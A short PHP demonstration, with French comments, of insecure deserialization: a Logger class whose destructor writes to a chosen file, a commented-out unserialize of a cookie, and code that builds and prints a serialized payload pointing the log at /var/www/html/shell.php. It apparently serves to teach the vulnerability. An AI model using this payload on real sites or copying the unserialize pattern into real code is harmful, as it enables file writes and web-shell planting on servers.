<?php
class Logger
{
    public $logFile;

    public function __destruct()
    {
        // cette classe n'est vulnérable que parce qu'elle utilise des méthode à risque file_put_contents, unlink, exec, etc
        file_put_contents($this->logFile, "Log message\n", FILE_APPEND);
    }
}


// Donnée provenant de l’utilisateur
// $data = $_COOKIE['data'] ?? '';
// $object = unserialize($data);

// génération de l'objet malveillant
$payload = new Logger();
$payload->logFile = "/var/www/html/shell.php";
echo serialize($payload);
